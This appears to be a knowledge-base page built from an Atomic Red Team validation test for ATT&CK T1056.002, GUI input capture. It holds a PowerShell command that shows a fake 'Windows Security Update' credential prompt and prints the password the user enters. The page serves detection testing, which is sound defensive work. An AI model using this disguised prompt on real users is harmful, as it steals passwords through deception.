---
atomic_guid: "2b162bfd-0928-4d4c-9ec3-4d9f88374b52"
title: "PowerShell - Prompt User for Password"
framework: "atomic"
generated: "true"
attack_technique_id: "T1056.002"
attack_technique_name: "Input Capture: GUI Input Capture"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.002/T1056.002.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "2b162bfd-0928-4d4c-9ec3-4d9f88374b52"
  - "PowerShell - Prompt User for Password"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# PowerShell - Prompt User for Password

Prompt User for Password (Local Phishing) as seen in Stitch RAT. Upon execution, a window will appear for the user to enter their credentials.

Reference: https://github.com/nathanlopez/Stitch/blob/master/PyLib/askpass.py

## Metadata

- Atomic GUID: 2b162bfd-0928-4d4c-9ec3-4d9f88374b52
- Technique: T1056.002: Input Capture: GUI Input Capture
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1056.002/T1056.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1056-input_capture|T1056.002]]

## Executor

- name: powershell

### Command

```powershell
# Creates GUI to prompt for password. Expect long pause before prompt is available.    
$cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName)
# Using write-warning to allow message to show on console as echo and other similar commands are not visable from the Invoke-AtomicTest framework.
write-warning $cred.GetNetworkCredential().Password
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.002/T1056.002.yaml)
